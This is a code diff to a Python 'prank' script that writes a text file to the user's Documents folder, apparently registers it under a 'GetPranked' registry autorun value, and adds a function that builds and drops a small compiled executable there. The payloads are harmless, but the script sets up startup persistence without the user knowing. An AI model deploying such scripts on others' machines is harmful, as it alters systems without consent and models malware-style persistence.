@@ -1,14 +1,42 @@
 import winreg as reg
 import os
+import shutil
+from pathlib import Path
 
-FILE_PATH = os.path.join(os.path.join(os.path.expanduser("~"), "Documents"), "prank.txt")
-RUN_PATH = r"notepad.exe " + FILE_PATH
+DOCUMENTS_PATH = os.path.join(os.path.expanduser("~"), "Documents")
+TEXT_FILE_PATH = os.path.join(DOCUMENTS_PATH, "prank.txt")
+EXECUTABLE_PY_PATH = os.path.join(DOCUMENTS_PATH, "quick_cmd.py")
+EXECUTABLE_PATH = os.path.join(DOCUMENTS_PATH, "quick_cmd.exe")
+RUN_PATH = r"notepad.exe " + TEXT_FILE_PATH
 VALUE_NAME = "GetPranked"
 
 def create_file(): # Creates the file if it doesn't already exist
-    with open(FILE_PATH, "w") as file:
+    with open(TEXT_FILE_PATH, "w") as file:
         file.write("You've been pranked")
     # print(file_path)
+
+def create_quick_cmd():
+    launcher_code = """
+import os
+os.system('start cmd /c exit')
+""" # Code within the created file
+    with open(EXECUTABLE_PY_PATH, "w") as file:
+        file.write(launcher_code)
+    os.system(f"python -m PyInstaller --onefile \"{EXECUTABLE_PY_PATH}\"") # Turns the created Python file into an executable
+    # Moves the file to the documents folder
+    dist_executable = Path("dist") / "quick_cmd.exe"
+    destination = os.path.join(DOCUMENTS_PATH, "quick_cmd.exe")
+    if dist_executable.exists():
+        shutil.move(str(dist_executable), str(destination))
+    else:
+        pass
+    # Remove created folders and files to keep things clean
+    for folder in ["dist", "build"]:
+        if Path(folder).exists():
+            shutil.rmtree(folder)
+    spec_file = Path("quick_cmd.spec")
+    if spec_file.exists():
+        spec_file.unlink()
 
 
 def add_to_startup(): # Add AutoRuns on system reboot
